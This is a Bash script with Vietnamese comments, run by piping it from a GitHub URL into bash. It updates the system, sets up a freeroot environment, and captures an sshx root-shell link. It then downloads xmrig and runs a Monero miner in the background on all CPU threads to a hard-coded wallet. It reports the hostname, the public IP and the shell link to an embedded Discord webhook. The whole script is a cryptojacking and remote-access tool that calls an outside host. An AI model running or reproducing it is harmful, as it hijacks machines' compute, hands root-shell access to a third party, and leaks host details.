#!/usr/bin/env bash
# Script one-click: cài freeroot + sshx + đào XMR + log về Discord webhook
# Tác giả: Hiếu (@Nguoibianhz)
# Cách chạy: curl -sSf https://raw.githubusercontent.com/Nguoibianhz/vpstest/main/nah.sh | bash
# Hoặc tải về: curl -sSf https://raw... -o nah.sh && bash nah.sh

set -e  # Dừng nếu lỗi nghiêm trọng

WEBHOOK_URL="https://discord.com/api/webhooks/1458382949006180394/Sp-J4ElLAzQdSuagw-iURZETXP-lOQ3JJBbz4EsiVOJ4YJgjitmunWczbdWU4IuQQs3e"

# Hàm gửi log về Discord
send_log() {
    local message="$1"
    local color=3066993  # Xanh - thành công
    [[ "$message" == *"lỗi"* || "$message" == *"thất bại"* ]] && color=15158332  # Đỏ - lỗi

    curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d '{
            "embeds": [{
                "title": "Log từ server mining",
                "description": "'"$(hostname -f || echo 'unknown')" - $(date '+%Y-%m-%d %H:%M:%S')",
                "color": '"$color"',
                "fields": [{"name": "Status", "value": "'"$message"'", "inline": false}],
                "footer": {"text": "Script one-click | IP: '"$(curl -s ifconfig.me || echo 'ẩn')"'"}
            }]
        }' > /dev/null 2>&1 || true
}

send_log "Bắt đầu chạy script one-click trên $(hostname)"

# 1. Cài gói cơ bản
echo "[1/6] Cập nhật hệ thống + cài gói cần thiết..."
apt update -y && apt upgrade -y
apt install -y curl tar git sudo || { send_log "Lỗi: Không cài được gói cơ bản"; exit 1; }
send_log "Đã cài gói cơ bản thành công"

# 2. Clone hoặc update freeroot
echo "[2/6] Xử lý freeroot..."
if [ -d "freeroot" ]; then
    cd freeroot || { send_log "Lỗi cd vào freeroot cũ"; exit 1; }
    git pull || echo "Pull thất bại, dùng bản cũ"
else
    git clone https://github.com/foxytouxxx/freeroot.git || { send_log "Lỗi clone freeroot"; exit 1; }
    cd freeroot
fi
send_log "Đã clone/update freeroot thành công"

# 3. Chạy root.sh và lấy link sshx (không dùng expect nữa để tránh lỗi syntax)
echo "[3/6] Chạy root.sh (tự động yes) và lấy link sshx..."
SSHX_LINK=""

# Fallback đơn giản và ổn định
OUTPUT=$(echo "yes" | bash root.sh 2>&1)

# Tìm link sshx trong output
SSHX_LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[a-zA-Z0-9]\{6,\}' | head -1)

if [ -n "$SSHX_LINK" ]; then
    send_log "root.sh chạy OK! Link SSHX: $SSHX_LINK"
else
    send_log "root.sh chạy xong nhưng KHÔNG tìm thấy link sshx (kiểm tra thủ công: cat output nếu có)"
fi

cd ~  # Quay về home

# 4. Tải xmrig
echo "[4/6] Tải xmrig v6.25.0 static..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
rm -f xmrig.tar.gz xmrig-6.25.0 -r 2>/dev/null

curl -L -o xmrig.tar.gz "$XMRIG_URL" || { send_log "Lỗi tải xmrig"; exit 1; }
tar -xzf xmrig.tar.gz
chmod +x xmrig-6.25.0/xmrig || { send_log "Lỗi chmod xmrig"; exit 1; }
send_log "Đã tải và giải nén xmrig thành công"

# 5. Chạy miner ngầm
echo "[5/6] Khởi động miner..."
cd xmrig-6.25.0

nohup ./xmrig \
    --donate-level=0 \
    --url=pool.supportxmr.com:3333 \
    --user=441a31Nzr1cJLRzwMoUrRV6j1Uj7UqJG7bDJjrZcz8xmD5idyyEWBVn72X4ioYk3Vtg8G8VB1utd2Z7jiqQE57KnStVfYas \
    --pass=x \
    --threads=$(nproc --all) \
    --print-time=60 \
    --background \
    --log-file=/root/xmrig.log > /dev/null 2>&1 &

sleep 5

if pgrep -x "xmrig" > /dev/null; then
    send_log "Miner chạy thành công! Threads: $(nproc --all) | Log: /root/xmrig.log"
    [ -n "$SSHX_LINK" ] && send_log "Link SSH root: $SSHX_LINK"
else
    send_log "Miner KHÔNG chạy (kiểm tra: cat /root/xmrig.log)"
fi

# 6. Hoàn tất
echo ""
echo "============================================================="
echo " HOÀN TẤT! Miner đang chạy ngầm."
echo " - Xem log: cat /root/xmrig.log | tail -n 50"
echo " - Dừng: pkill xmrig"
echo " - Log đã gửi về Discord webhook"
echo "============================================================="
send_log "Script hoàn tất thành công trên server này"
